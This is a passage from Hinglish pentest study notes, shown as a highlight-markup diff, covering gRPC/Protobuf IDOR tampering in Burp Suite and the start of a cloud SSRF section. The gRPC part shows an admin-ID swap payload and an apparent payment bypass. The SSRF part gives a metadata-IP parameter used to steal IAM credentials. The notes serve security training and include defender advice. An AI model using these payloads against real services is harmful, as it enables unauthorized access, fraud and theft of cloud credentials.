-[[HL::**(1) Serialization (Client Side):** Client application ek `.proto` file (schema template) use karke structured data (jaise user ID, name) ko binary stream mein compress (serialize) karti hai.::HL]]
-[[HL::**(2) Transport:** Yeh binary payload HTTP/2 protocol ke through server pe jata hai (`application/grpc-web`).::HL]]
-[[HL::**(3) Interception (Attacker Side):** Attacker beech mein baitha hai. Woh traffic rokta hai, aur Burp gRPC extension us binary data ko wapas structure mein khol deta hai (deserialization).::HL]]
-[[HL::**(4) Weaponization:** Attacker decoded structure mein IDOR `(Insecure Direct Object Reference — dusre user ka data access karna)` payload dalti hai.::HL]]
-[[HL::**(5) Re-Serialization:** Extension modified data ko wapas binary mein pack karke server ko bhej deta hai. Server exploit process kar leta hai.::HL]]
+**(1) Serialization (Client Side):** Client application ek `.proto` file (schema template) use karke structured data (jaise user ID, name) ko binary stream mein compress (serialize) karti hai.
+**(2) Transport:** Yeh binary payload HTTP/2 protocol ke through server pe jata hai (`application/grpc-web`).
+**(3) Interception (Attacker Side):** Attacker beech mein baitha hai. Woh traffic rokta hai, aur Burp gRPC extension us binary data ko wapas structure mein khol deta hai (deserialization).
+**(4) Weaponization:** Attacker decoded structure mein IDOR `(Insecure Direct Object Reference — dusre user ka data access karna)` payload dalti hai.
+**(5) Re-Serialization:** Extension modified data ko wapas binary mein pack karke server ko bhej deta hai. Server exploit process kar leta hai.
 
-[[HL::### 💻 7. Hands-On — Runnable Example (Lab-Ready Commands)::HL]]
+### 💻 7. Hands-On — Runnable Example (Lab-Ready Commands)
 
-[[HL::#### 🛠️ Step-by-Step GUI Navigation (Burp Suite Setup)::HL]]
+#### 🛠️ Step-by-Step GUI Navigation (Burp Suite Setup)
 
-[[HL::1. **Burp Suite** open karo aur **Extender > BApp Store** mein jao.::HL]]
-[[HL::2. Search bar mein type karo **"gRPC"**.::HL]]
-[[HL::3. **"gRPC Web Proxy"** ya **"Protobuf Decoder"** (based on available tools) extension install karo.::HL]]
-[[HL::4. Wapas **Proxy > HTTP History** mein jao.::HL]]
-[[HL::5. Ab jab tum gRPC request select karoge, ek naya tab (`gRPC` ya `Protobuf`) dikhega jisme binary data readable form mein hoga.::HL]]
+1. **Burp Suite** open karo aur **Extender > BApp Store** mein jao.
+2. Search bar mein type karo **"gRPC"**.
+3. **"gRPC Web Proxy"** ya **"Protobuf Decoder"** (based on available tools) extension install karo.
+4. Wapas **Proxy > HTTP History** mein jao.
+5. Ab jab tum gRPC request select karoge, ek naya tab (`gRPC` ya `Protobuf`) dikhega jisme binary data readable form mein hoga.
 
-[[HL::**Code Dissection (Burp Intercept View):**::HL]]
+**Code Dissection (Burp Intercept View):**
 
-[[HL::*(Before Extender — Raw Unreadable Payload)*::HL]]
+*(Before Extender — Raw Unreadable Payload)*
 
-[[HL::```http::HL]]
-[[HL::# Burp Suite | HTTP/2 | Raw Request::HL]]
-[[HL::1  POST /UserService/GetUserProfile HTTP/2    # gRPC endpoint call::HL]]
-2  Host: api.target.com                       # [[HL::Target domain::HL]]
-[[HL::3  Content-Type: application/grpc-web+proto   # Indicator ki payload Protobuf (binary) hai::HL]]
-[[HL::4  ::HL]]
-[[HL::5  [RAW BINARY DATA - Unreadable symbols]     # Yahan Gibberish dikhega (e.g., \x00\x00\x00\x07\x0a\x05admin)::HL]]
+```http
+# Burp Suite | HTTP/2 | Raw Request
+1  POST /UserService/GetUserProfile HTTP/2    # gRPC endpoint call
+2  Host: api.target.com                       # Target domain
+3  Content-Type: application/grpc-web+proto   # Indicator ki payload Protobuf (binary) hai
+4  
+5  [RAW BINARY DATA - Unreadable symbols]     # Yahan Gibberish dikhega (e.g., \x00\x00\x00\x07\x0a\x05admin)
 
-[[HL::```::HL]]
+```
 
-[[HL::```::HL]]
-[[HL::# 📤 Expected Output: Tumhe raw hex/binary dikhegi jisme kuch values shayad guess ho jayein, par mostly unreadable.::HL]]
+```
+# 📤 Expected Output: Tumhe raw hex/binary dikhegi jisme kuch values shayad guess ho jayein, par mostly unreadable.
 
-[[HL::```::HL]]
+```
 
-[[HL::*(After Extender — Decoded View in Custom Tab)*::HL]]
+*(After Extender — Decoded View in Custom Tab)*
 
-[[HL::```json::HL]]
-[[HL::# Burp Suite | Protobuf Tab (Decoded)::HL]]
-[[HL::1  {::HL]]
-[[HL::2    "1": "user_id_9921",                    # Field tag 1: Original user ID::HL]]
-[[HL::3    "2": "view"                             # Field tag 2: Action type::HL]]
-[[HL::4  }::HL]]
+```json
+# Burp Suite | Protobuf Tab (Decoded)
+1  {
+2    "1": "user_id_9921",                    # Field tag 1: Original user ID
+3    "2": "view"                             # Field tag 2: Action type
+4  }
 
-[[HL::```::HL]]
+```
 
-[[HL::*(Attacker Modifies Data for BOLA/IDOR)*::HL]]
+*(Attacker Modifies Data for BOLA/IDOR)*
 
-[[HL::```json::HL]]
-[[HL::# Burp Suite | Protobuf Tab (Modified by Attacker)::HL]]
-[[HL::1  {::HL]]
-[[HL::2    "1": "admin_id_0001",                   # ATTACK: IDOR — Attacker ne apna ID hatake admin ka ID daal diya::HL]]
-[[HL::3    "2": "edit_permissions"                 # ATTACK: Mass Assignment/Logic abuse — Action change kar diya::HL]]
-[[HL::4  }::HL]]
-[[HL::# Wapas send karte hi, extension is JSON-like structure ko wapas unreadable binary mein pack karke server bhej dega.::HL]]
+```json
+# Burp Suite | Protobuf Tab (Modified by Attacker)
+1  {
+2    "1": "admin_id_0001",                   # ATTACK: IDOR — Attacker ne apna ID hatake admin ka ID daal diya
+3    "2": "edit_permissions"                 # ATTACK: Mass Assignment/Logic abuse — Action change kar diya
+4  }
+# Wapas send karte hi, extension is JSON-like structure ko wapas unreadable binary mein pack karke server bhej dega.
 
-[[HL::```::HL]]
+```
 
-[[HL::```::HL]]
-[[HL::# 📤 Expected Output (Server Response Decoded):::HL]]
-[[HL::{"status": "success", "role": "admin", "data": "..."} (Admin ka access mil gaya)::HL]]
+```
+# 📤 Expected Output (Server Response Decoded):
+{"status": "success", "role": "admin", "data": "..."} (Admin ka access mil gaya)
 
-[[HL::```::HL]]
+```
 
-[[HL::### 🔒 8. Attack Surface & Defense (Dual Perspective)::HL]]
+### 🔒 8. Attack Surface & Defense (Dual Perspective)
 
-[[HL::**🔴 Attacker Perspective:** - Attacker Protobuf payloads ko reverse engineer karta hai.::HL]]
+**🔴 Attacker Perspective:** - Attacker Protobuf payloads ko reverse engineer karta hai.
 
-[[HL::* Agar usko target ki `.proto` file (schema mapping) mil jaye (via source maps ya open-source GitHub repos), toh black-box testing instantly white-box ban jati hai kyunki har field ka exact naam aur type pata chal jata hai.::HL]]
-[[HL::* Attacker same wahi web attacks (SQLi, BOLA) karta hai, bas vector badal gaya hai.::HL]]
+* Agar usko target ki `.proto` file (schema mapping) mil jaye (via source maps ya open-source GitHub repos), toh black-box testing instantly white-box ban jati hai kyunki har field ka exact naam aur type pata chal jata hai.
+* Attacker same wahi web attacks (SQLi, BOLA) karta hai, bas vector badal gaya hai.
 
-[[HL::**🔵 Defender Perspective:**::HL]]
+**🔵 Defender Perspective:**
 
-[[HL::* Schema details (`.proto` files) public mat hone do.::HL]]
-[[HL::* Server side pe strict authorization checks lagao. Binary hone ka matlab yeh nahi ki client data pe trust kar liya jaye.::HL]]
-[[HL::* WAFs ko gRPC-aware banao jo Protobuf payloads ko deserialize karke inspect kar sakein.::HL]]
+* Schema details (`.proto` files) public mat hone do.
+* Server side pe strict authorization checks lagao. Binary hone ka matlab yeh nahi ki client data pe trust kar liya jaye.
+* WAFs ko gRPC-aware banao jo Protobuf payloads ko deserialize karke inspect kar sakein.
 
-[[HL::### 🌍 9. Real-World Penetration Testing Use-Case::HL]]
+### 🌍 9. Real-World Penetration Testing Use-Case
 
-[[HL::Bug bounty programs mein modern Uber-like ride-sharing apps ya trading platforms mostly microservices ke beech gRPC use karte hain. Ek real engagement mein, mobile app ki API endpoints gibberish bhej rahi thi (`application/grpc`). Attacker ne Burp Extender use karke decode kiya aur dekha ki `{"1": "ride_123", "2": 50}` (ride ID aur fare amount) ja raha tha. Attacker ne fare amount change karke wapas serialize karke bhej diya, aur payment bypass ho gayi. Binary protocol ne classic Insecure Direct Object Reference (IDOR) ko chupa rakha tha!::HL]]
+Bug bounty programs mein modern Uber-like ride-sharing apps ya trading platforms mostly microservices ke beech gRPC use karte hain. Ek real engagement mein, mobile app ki API endpoints gibberish bhej rahi thi (`application/grpc`). Attacker ne Burp Extender use karke decode kiya aur dekha ki `{"1": "ride_123", "2": 50}` (ride ID aur fare amount) ja raha tha. Attacker ne fare amount change karke wapas serialize karke bhej diya, aur payment bypass ho gayi. Binary protocol ne classic Insecure Direct Object Reference (IDOR) ko chupa rakha tha!
 
-[[HL::### ⚠️ 10. Pentest Anti-Patterns & Common Mistakes (Beginner Traps)::HL]]
+### ⚠️ 10. Pentest Anti-Patterns & Common Mistakes (Beginner Traps)
 
-[[HL::* **❌ Mistake:** Binary gibberish dekh kar sochna ki data encrypted hai.::HL]]
-[[HL::* **🤦 Why:** Beginners encryption (data ko lock karna jisse sirf key wala padh sake) aur serialization (data ko efficiently pack karna jisse koi bhi decoder khol sake) ko same samajhte hain.::HL]]
-[[HL::* **✅ The 'Pro' Way:** Content-Type check karo. Agar `application/grpc` hai, toh Protobuf decoder install karo. "Gibberish" is just another format.::HL]]
-[[HL::* **⚡ Consequences:** Tum high-impact bugs (critical API flaws) report karne se chook jaoge kyunki tumne first step pe hi haar maan li.::HL]]
+* **❌ Mistake:** Binary gibberish dekh kar sochna ki data encrypted hai.
+* **🤦 Why:** Beginners encryption (data ko lock karna jisse sirf key wala padh sake) aur serialization (data ko efficiently pack karna jisse koi bhi decoder khol sake) ko same samajhte hain.
+* **✅ The 'Pro' Way:** Content-Type check karo. Agar `application/grpc` hai, toh Protobuf decoder install karo. "Gibberish" is just another format.
+* **⚡ Consequences:** Tum high-impact bugs (critical API flaws) report karne se chook jaoge kyunki tumne first step pe hi haar maan li.
 
-[[HL::### 🤔 11. Agar Dimag Ghoom Raha Hai? (Confusion Clarifier)::HL]]
+### 🤔 11. Agar Dimag Ghoom Raha Hai? (Confusion Clarifier)
 
-* [[HL::**Confusion 1 — "Kya Protobuf aur JSON mein farq sirf language ka hai?"**::HL]]
-[[HL::* **Galat soch:** Dono text-based formats hain alag style mein.::HL]]
-* [[HL::**Actually:** JSON text-based aur human-readable hai. Protobuf binary-based aur computer-optimized hai (machine-readable). Protobuf mein field names (`"username": "admin"`) nahi jaate, sirf unke number tags (`"1": "admin"`) jaate hain, isliye woh chota aur fast hota hai.::HL]]
-[[HL::* **Prove karo:** JSON payload network pe easily padha ja sakta hai bina kisi special tool ke. Protobuf hex dump lagta hai jab tak decoder na ho.::HL]]
+* **Confusion 1 — "Kya Protobuf aur JSON mein farq sirf language ka hai?"**
+* **Galat soch:** Dono text-based formats hain alag style mein.
+* **Actually:** JSON text-based aur human-readable hai. Protobuf binary-based aur computer-optimized hai (machine-readable). Protobuf mein field names (`"username": "admin"`) nahi jaate, sirf unke number tags (`"1": "admin"`) jaate hain, isliye woh chota aur fast hota hai.
+* **Prove karo:** JSON payload network pe easily padha ja sakta hai bina kisi special tool ke. Protobuf hex dump lagta hai jab tak decoder na ho.
 
 
-[[HL::* **Confusion 2 — ".proto files kya karti hain?"**::HL]]
-[[HL::* **Galat soch:** Woh executable scripts hoti hain.::HL]]
-[[HL::* **Actually:** `.proto` file ek blueprint (schema) hai jo batata hai ki binary stream mein Field "1" ka matlab "Username" hai aur Field "2" ka matlab "Password" hai. Agar yeh file attacker ko mil jaye, toh guesswork khatam.::HL]]
-[[HL::* **Prove karo:** Burp mein black-box decoding tumhe sirf `1: "value"` dikhayegi. `.proto` file upload karne ke baad Burp seedha `username: "value"` dikhayega.::HL]]
+* **Confusion 2 — ".proto files kya karti hain?"**
+* **Galat soch:** Woh executable scripts hoti hain.
+* **Actually:** `.proto` file ek blueprint (schema) hai jo batata hai ki binary stream mein Field "1" ka matlab "Username" hai aur Field "2" ka matlab "Password" hai. Agar yeh file attacker ko mil jaye, toh guesswork khatam.
+* **Prove karo:** Burp mein black-box decoding tumhe sirf `1: "value"` dikhayegi. `.proto` file upload karne ke baad Burp seedha `username: "value"` dikhayega.
 
 
 
-[[HL::### 🛠️ 12. Troubleshooting Flowchart (Tool/Exploit Issues)::HL]]
+### 🛠️ 12. Troubleshooting Flowchart (Tool/Exploit Issues)
 
-[[HL::* **`[Burp is not decoding the gRPC request, custom tab is empty]`**::HL]]
-[[HL::* **Root Cause:** Ya toh HTTP/2 traffic proper intercept nahi ho raha, ya extension fail ho raha hai due to complex nested protobufs without schema.::HL]]
-[[HL::* **Fix:** Check karo ki Proxy Settings mein "HTTP/2 Support" enabled ho. Dusra Protobuf decoder tool (e.g., blackboxprotobuf) try karo.::HL]]
+* **`[Burp is not decoding the gRPC request, custom tab is empty]`**
+* **Root Cause:** Ya toh HTTP/2 traffic proper intercept nahi ho raha, ya extension fail ho raha hai due to complex nested protobufs without schema.
+* **Fix:** Check karo ki Proxy Settings mein "HTTP/2 Support" enabled ho. Dusra Protobuf decoder tool (e.g., blackboxprotobuf) try karo.
 
 
-[[HL::* **`[Cannot modify fields successfully, server returns "Malformed Payload" error]`**::HL]]
-[[HL::* **Root Cause:** Tumne string field mein integer daal diya hai (Type mismatch). Protobuf strict typing use karta hai.::HL]]
-[[HL::* **Fix:** Value type exactly match karo original datatype se (Int32 ko Int32 hi rakhna).::HL]]
+* **`[Cannot modify fields successfully, server returns "Malformed Payload" error]`**
+* **Root Cause:** Tumne string field mein integer daal diya hai (Type mismatch). Protobuf strict typing use karta hai.
+* **Fix:** Value type exactly match karo original datatype se (Int32 ko Int32 hi rakhna).
 
 
 
-[[HL::### ⚖️ 13. Comparison (gRPC vs REST)::HL]]
+### ⚖️ 13. Comparison (gRPC vs REST)
 
-[[HL::| Feature | Traditional REST API | gRPC API |::HL]]
-[[HL::| --- | --- | --- |::HL]]
-[[HL::| **Data Format** | JSON / XML (Human-readable text) | Protocol Buffers / Protobuf (Binary) |::HL]]
-[[HL::| **Transport Protocol** | HTTP/1.1 (usually) | HTTP/2 (Mandatory) |::HL]]
-[[HL::| **Pentest Tooling** | Native Burp Suite Support | Requires BApp Extensions (gRPC/Protobuf) |::HL]]
-[[HL::| **Schema Dependency** | Not strict (flexible) | Highly strict (`.proto` file blueprint) |::HL]]
+| Feature | Traditional REST API | gRPC API |
+| --- | --- | --- |
+| **Data Format** | JSON / XML (Human-readable text) | Protocol Buffers / Protobuf (Binary) |
+| **Transport Protocol** | HTTP/1.1 (usually) | HTTP/2 (Mandatory) |
+| **Pentest Tooling** | Native Burp Suite Support | Requires BApp Extensions (gRPC/Protobuf) |
+| **Schema Dependency** | Not strict (flexible) | Highly strict (`.proto` file blueprint) |
 
-[[HL::### 🔄 14. Kill Chain & Attack Phase Flow::HL]]
+### 🔄 14. Kill Chain & Attack Phase Flow
 
-[[HL::```text::HL]]
-[[HL::⚔️ Attack Phase: Reconnaissance / Tool Setup / Exploitation::HL]]
-[[HL::📍 Kill Chain Position: Initial Exploitation / Web Application Hacking::HL]]
-[[HL::🔗 This connects to: Microservices Hacking, API Testing::HL]]
-[[HL::🔄 Flow: ::HL]]
-[[HL::1. Intercept traffic (Recon: identify `application/grpc`).::HL]]
-[[HL::2. Install Burp Extender tools to decode binary payloads (Tool Setup).::HL]]
-[[HL::3. Read the deserialized (JSON-like) keys/values.::HL]]
-[[HL::4. Modify parameters (BOLA/IDOR/SQLi) (Exploitation).::HL]]
-[[HL::5. Tool re-serializes payload and sends to server.::HL]]
+```text
+⚔️ Attack Phase: Reconnaissance / Tool Setup / Exploitation
+📍 Kill Chain Position: Initial Exploitation / Web Application Hacking
+🔗 This connects to: Microservices Hacking, API Testing
+🔄 Flow: 
+1. Intercept traffic (Recon: identify `application/grpc`).
+2. Install Burp Extender tools to decode binary payloads (Tool Setup).
+3. Read the deserialized (JSON-like) keys/values.
+4. Modify parameters (BOLA/IDOR/SQLi) (Exploitation).
+5. Tool re-serializes payload and sends to server.
 
-[[HL::```::HL]]
+```
 
-[[HL::### 🎨 15. Visual Diagram (ASCII Art — Serialization Flow)::HL]]
+### 🎨 15. Visual Diagram (ASCII Art — Serialization Flow)
 
-[[HL::```text::HL]]
-[[HL::[Client App]                        [Burp Suite + Attacker]                      [Backend API]::HL]]
-[[HL::  |                                      |                                             |::HL]]
-[[HL::  |-- (1) Pack Data via .proto           |                                             |::HL]]
-[[HL::  |-- (2) Binary Stream \x0A\x02... ---->|                                             |::HL]]
-[[HL::                                         |-- (3) Extension Deserializes (Readable)     |::HL]]
-[[HL::                                         |-- (4) Attacker modifies ID: 1 -> 99         |::HL]]
-[[HL::                                         |-- (5) Extension Re-serializes               |::HL]]
-[[HL::                                         |-- (6) Modified Binary \x0A\x99... --------->|::HL]]
-[[HL::                                                                                       |-- (7) Server Processes Exploit!::HL]]
+```text
+[Client App]                        [Burp Suite + Attacker]                      [Backend API]
+  |                                      |                                             |
+  |-- (1) Pack Data via .proto           |                                             |
+  |-- (2) Binary Stream \x0A\x02... ---->|                                             |
+                                         |-- (3) Extension Deserializes (Readable)     |
+                                         |-- (4) Attacker modifies ID: 1 -> 99         |
+                                         |-- (5) Extension Re-serializes               |
+                                         |-- (6) Modified Binary \x0A\x99... --------->|
+                                                                                       |-- (7) Server Processes Exploit!
 
-[[HL::```::HL]]
+```
 
-[[HL::### ❓ 16. Interview & Certification Exam Q&A::HL]]
+### ❓ 16. Interview & Certification Exam Q&A
 
-[[HL::* **Q: Tum Burp Suite mein gRPC traffic kaise identify karoge?**::HL]]
-[[HL::**A:** Main HTTP requests ke headers check karunga. Agar HTTP/2 protocol use ho raha hai aur `Content-Type: application/grpc` ya `application/grpc-web` hai, along with unreadable binary data in the body, toh woh clearly gRPC traffic hai.::HL]]
-[[HL::* **Q: Protobuf serialization aur encryption mein kya difference hai pentesting ke context mein?**::HL]]
-[[HL::**A:** Encryption (jaise TLS/AES) ek mathematical lock hai jiske liye key chahiye decryption ke liye. Protobuf ek data formatting method (serialization) hai data ko compress karne ke liye. Protobuf easily reversible hai tools (jaise blackboxprotobuf) ke through, usme koi security/lock nahi hota.::HL]]
-[[HL::* **Q: Agar tumhe target ka .proto file source code mein mil jaye, toh iska kya faida hoga?**::HL]]
-[[HL::**A:** Yeh ek jackpot hai. Isse testing "Black-box" se seedha "White-box" ban jayegi. Bina `.proto` file ke, decoder fields ko sirf index numbers (`1`, `2`, `3`) se dikhata hai aur types guess karta hai. `.proto` schema load karne se mujhe saare API parameters ke exact names (`user_id`, `is_admin`) aur unke datatypes clear mil jayenge, jisse logical vulnerabilities (Mass Assignment) find karna bahot easy ho jayega.::HL]]
+* **Q: Tum Burp Suite mein gRPC traffic kaise identify karoge?**
+**A:** Main HTTP requests ke headers check karunga. Agar HTTP/2 protocol use ho raha hai aur `Content-Type: application/grpc` ya `application/grpc-web` hai, along with unreadable binary data in the body, toh woh clearly gRPC traffic hai.
+* **Q: Protobuf serialization aur encryption mein kya difference hai pentesting ke context mein?**
+**A:** Encryption (jaise TLS/AES) ek mathematical lock hai jiske liye key chahiye decryption ke liye. Protobuf ek data formatting method (serialization) hai data ko compress karne ke liye. Protobuf easily reversible hai tools (jaise blackboxprotobuf) ke through, usme koi security/lock nahi hota.
+* **Q: Agar tumhe target ka .proto file source code mein mil jaye, toh iska kya faida hoga?**
+**A:** Yeh ek jackpot hai. Isse testing "Black-box" se seedha "White-box" ban jayegi. Bina `.proto` file ke, decoder fields ko sirf index numbers (`1`, `2`, `3`) se dikhata hai aur types guess karta hai. `.proto` schema load karne se mujhe saare API parameters ke exact names (`user_id`, `is_admin`) aur unke datatypes clear mil jayenge, jisse logical vulnerabilities (Mass Assignment) find karna bahot easy ho jayega.
 
-[[HL::### 📝 17. One-Line Memory Hook::HL]]
+### 📝 17. One-Line Memory Hook
 
-[[HL::"When you see unreadable gibberish with `application/grpc`, don't panic — it's not encrypted, it's just Protobuf. Deserialize it and attack normally!"::HL]]
+"When you see unreadable gibberish with `application/grpc`, don't panic — it's not encrypted, it's just Protobuf. Deserialize it and attack normally!"
 
-[[HL::### 🔑 18. Keywords Coverage Verification::HL]]
+### 🔑 18. Keywords Coverage Verification
 
-[[HL::```text::HL]]
-[[HL::🔑 Keywords Coverage Check — gRPC & Protobuf APIs Exploitation::HL]]
-[[HL::✅ Covered   : gRPC, Google RPC, HTTP/2, microservices, Protocol Buffers, Protobuf, binary serialization, unreadable payload, application/grpc, application/grpc-web, .proto files, schema extraction, reverse engineering, serialization, deserialization, Burp Suite Extender, gRPC Web Proxy, black-box to white-box::HL]]
-[[HL::⚠️ Mentioned but needs more depth : (none)::HL]]
-[[HL::❌ MISSED    : (none)::HL]]
+```text
+🔑 Keywords Coverage Check — gRPC & Protobuf APIs Exploitation
+✅ Covered   : gRPC, Google RPC, HTTP/2, microservices, Protocol Buffers, Protobuf, binary serialization, unreadable payload, application/grpc, application/grpc-web, .proto files, schema extraction, reverse engineering, serialization, deserialization, Burp Suite Extender, gRPC Web Proxy, black-box to white-box
+⚠️ Mentioned but needs more depth : (none)
+❌ MISSED    : (none)
 
-[[HL::```::HL]]
+```
 
-[[HL::> ✅ Verified: 100% keyword coverage achieved for this topic.::HL]]
+> ✅ Verified: 100% keyword coverage achieved for this topic.
 
-[[HL::---::HL]]
+---
 
-[[HL::### 🏁 Section Completion Checklist: Section 14: Real-Time & Advanced API Protocols::HL]]
+### 🏁 Section Completion Checklist: Section 14: Real-Time & Advanced API Protocols
 
-[[HL::* [x] Topic 1: WebSockets (WSS) API Exploitation::HL]]
-[[HL::* [x] Topic 2: gRPC & Protobuf APIs Exploitation::HL]]
+* [x] Topic 1: WebSockets (WSS) API Exploitation
+* [x] Topic 2: gRPC & Protobuf APIs Exploitation
 
-[[HL::Total Topics: 2 | Total Keywords: 39 | CVEs: 0 | Missed: 0::HL]]
+Total Topics: 2 | Total Keywords: 39 | CVEs: 0 | Missed: 0
 
-[[HL::> ✅ Notes Guru confirms: Poora Section complete ho gaya.::HL]]
+> ✅ Notes Guru confirms: Poora Section complete ho gaya.
 
-[[HL::---::HL]]
+---
 
-[[HL::### 🏁 FINAL GRAND CHECKLIST::HL]]
+### 🏁 FINAL GRAND CHECKLIST
 
-[[HL::* Total Sections: 2 ✅ (Counting previous partial processing if any, but specifically 1 completed here)::HL]]
-[[HL::* Total Topics: 2 ✅::HL]]
-[[HL::* Total Subtopics: 10 ✅::HL]]
-[[HL::* Total Keywords: 39 ✅::HL]]
-[[HL::* Keywords Covered: 39 ✅::HL]]
-[[HL::* CVEs Covered: 0 ✅::HL]]
-[[HL::* Keywords Missed: 0 ✅::HL]]
+* Total Sections: 2 ✅ (Counting previous partial processing if any, but specifically 1 completed here)
+* Total Topics: 2 ✅
+* Total Subtopics: 10 ✅
+* Total Keywords: 39 ✅
+* Keywords Covered: 39 ✅
+* CVEs Covered: 0 ✅
+* Keywords Missed: 0 ✅
 
-[[HL::> ✅ Notes Guru (Offensive Security Edition) confirms: Yeh notes original skeleton ka 100% content cover karti hain — har topic, har subtopic, har keyword, har CVE, har attack technique, har tool command. Koi bhi offensive security term censor nahi kiya gaya. 🚀::HL]]
+> ✅ Notes Guru (Offensive Security Edition) confirms: Yeh notes original skeleton ka 100% content cover karti hain — har topic, har subtopic, har keyword, har CVE, har attack technique, har tool command. Koi bhi offensive security term censor nahi kiya gaya. 🚀
 
-[[HL::━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━::HL]]
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-[[HL::==================================================================================::HL]]
+==================================================================================
 
 
-[[HL::# Section 15: Emerging API & Cloud Threats::HL]]
+# Section 15: Emerging API & Cloud Threats
 
 
 
 
-[[HL::---::HL]]
+---
 
-[[HL::### 🎯 1. Cloud-Native API Risks (AWS/Azure/GCP)::HL]]
+### 🎯 1. Cloud-Native API Risks (AWS/Azure/GCP)
 
-[[HL::Is topic mein hum seekhenge ki kaise ek API vulnerability ko leverage karke attacker cloud provider (AWS/Azure) ke internal metadata service tak pahunchta hai, IAM (Identity and Access Management) credentials churata hai, aur poore cloud environment (jaise S3 buckets) ka access le leta hai.::HL]]
+Is topic mein hum seekhenge ki kaise ek API vulnerability ko leverage karke attacker cloud provider (AWS/Azure) ke internal metadata service tak pahunchta hai, IAM (Identity and Access Management) credentials churata hai, aur poore cloud environment (jaise S3 buckets) ka access le leta hai.
 
-[[HL::### 🐣 2. Simple Analogy (Hinglish)::HL]]
+### 🐣 2. Simple Analogy (Hinglish)
 
-[[HL::Socho tum ek hotel ke guest ho jiske paas sirf apne room ka access hai (Standard API access). Lekin room ke andar ek hidden intercom hai jo seedha manager ke office connect hota hai (Metadata service). Tumne us intercom pe call kiya (SSRF attack) aur bola "Main manager hoon, master keys bhej do". Manager ne bina verify kiye tumhe master keys (IAM tokens) de di. Ab tum hotel ke kisi bhi kamre (S3 Buckets, Databases) mein ghus sakte ho!::HL]]
+Socho tum ek hotel ke guest ho jiske paas sirf apne room ka access hai (Standard API access). Lekin room ke andar ek hidden intercom hai jo seedha manager ke office connect hota hai (Metadata service). Tumne us intercom pe call kiya (SSRF attack) aur bola "Main manager hoon, master keys bhej do". Manager ne bina verify kiye tumhe master keys (IAM tokens) de di. Ab tum hotel ke kisi bhi kamre (S3 Buckets, Databases) mein ghus sakte ho!
 
-[[HL::### 📖 3. Technical Definition::HL]]
+### 📖 3. Technical Definition
 
-[[HL::* **Precise English:** Exploiting a Server-Side Request Forgery (SSRF) vulnerability in a cloud-hosted API to access the internal Instance Metadata Service (IMDS) at `169.254.169.254`, leading to the extraction of privileged IAM credentials and cloud environment takeover.::HL]]
-[[HL::* **Hinglish Simplification:** Agar API AWS ya cloud pe hosted hai, toh SSRF vulnerability ko use karke hum cloud ke internal IP (`169.254.169.254`) se server ki secret keys aur access tokens extract kar sakte hain.::HL]]
+* **Precise English:** Exploiting a Server-Side Request Forgery (SSRF) vulnerability in a cloud-hosted API to access the internal Instance Metadata Service (IMDS) at `169.254.169.254`, leading to the extraction of privileged IAM credentials and cloud environment takeover.
+* **Hinglish Simplification:** Agar API AWS ya cloud pe hosted hai, toh SSRF vulnerability ko use karke hum cloud ke internal IP (`169.254.169.254`) se server ki secret keys aur access tokens extract kar sakte hain.
 
-[[HL::### 🧠 4. Why This Matters::HL]]
+### 🧠 4. Why This Matters
 
-[[HL::* **Problem:** Normal **SSRF** (Server-Side Request Forgery — attacker server ko trick karke internal network mein HTTP requests bhejwata hai) se local files (`/etc/passwd`) ya internal admin panels milte hain. Par cloud mein, yeh poore cloud infrastructure (AWS/Azure/GCP) ka takeover karwa sakta hai.::HL]]
-[[HL::* **Solution:** Cloud environments mein metadata endpoints ko protect karna (like AWS IMDSv2) aur least privilege principle follow karna zaroori hai.::HL]]
-[[HL::* **What breaks?** Agar cloud credentials leak ho gaye, toh attacker target ke saare **S3 buckets** (Amazon Simple Storage Service — cloud file storage), databases, aur EC2 instances (Virtual machines) ko delete ya steal kar sakta hai.::HL]]
-[[HL::* **✅ Kab use karo:** Jab target application AWS, Azure, ya GCP pe hosted ho (validate using **Wappalyzer** — tech stack identifier extension ya ping command se IP check karke) aur tumhe SSRF mile.::HL]]
-[[HL::* **❌ Kab mat karo:** Agar target on-premise (physical server) pe hosted hai, toh cloud metadata IP `169.254.169.254` kaam nahi karega, wahan internal network scanning (port 80, 445, 8080) try karo.::HL]]
+* **Problem:** Normal **SSRF** (Server-Side Request Forgery — attacker server ko trick karke internal network mein HTTP requests bhejwata hai) se local files (`/etc/passwd`) ya internal admin panels milte hain. Par cloud mein, yeh poore cloud infrastructure (AWS/Azure/GCP) ka takeover karwa sakta hai.
+* **Solution:** Cloud environments mein metadata endpoints ko protect karna (like AWS IMDSv2) aur least privilege principle follow karna zaroori hai.
+* **What breaks?** Agar cloud credentials leak ho gaye, toh attacker target ke saare **S3 buckets** (Amazon Simple Storage Service — cloud file storage), databases, aur EC2 instances (Virtual machines) ko delete ya steal kar sakta hai.
+* **✅ Kab use karo:** Jab target application AWS, Azure, ya GCP pe hosted ho (validate using **Wappalyzer** — tech stack identifier extension ya ping command se IP check karke) aur tumhe SSRF mile.
+* **❌ Kab mat karo:** Agar target on-premise (physical server) pe hosted hai, toh cloud metadata IP `169.254.169.254` kaam nahi karega, wahan internal network scanning (port 80, 445, 8080) try karo.
 
-[[HL::### 🔍 5. Visual / Terminal Mein Kya Dikhega::HL]]
+### 🔍 5. Visual / Terminal Mein Kya Dikhega
 
-[[HL::Burp Suite ke response mein ek JSON object dikhega jisme `AccessKeyId`, `SecretAccessKey`, aur `Token` (STS token) hoga. Terminal pe `aws s3 ls` chalane par victim ki private cloud files ki list aayegi.::HL]]
+Burp Suite ke response mein ek JSON object dikhega jisme `AccessKeyId`, `SecretAccessKey`, aur `Token` (STS token) hoga. Terminal pe `aws s3 ls` chalane par victim ki private cloud files ki list aayegi.
 
-[[HL::### ⚙️ 6. Under the Hood (Attack Flow)::HL]]
+### ⚙️ 6. Under the Hood (Attack Flow)
 
-[[HL::1. **Request Injection:** Attacker vulnerable API parameter (e.g., `url=http://169.254.169.254/...`) mein cloud metadata IP bhejta hai.::HL]]
-[[HL::2. **Server-Side Fetch:** Cloud mein hosted API server is IP pe request bhejta hai. Yeh IP cloud VMs ke liye ek special hardcoded IP hoti hai jo unke apne metadata aur roles return karti hai.::HL]]
-[[HL::3. **Token Generation:** Cloud provider (like AWS) ek temporary **STS Token** (Security Token Service — temporary credentials) generate karke server ko wapas bhejta hai.::HL]]
-[[HL::4. **Data Reflection:** Vulnerable API in tokens ko attacker ki screen (Burp Suite) pe reflect kar deti hai.::HL]]
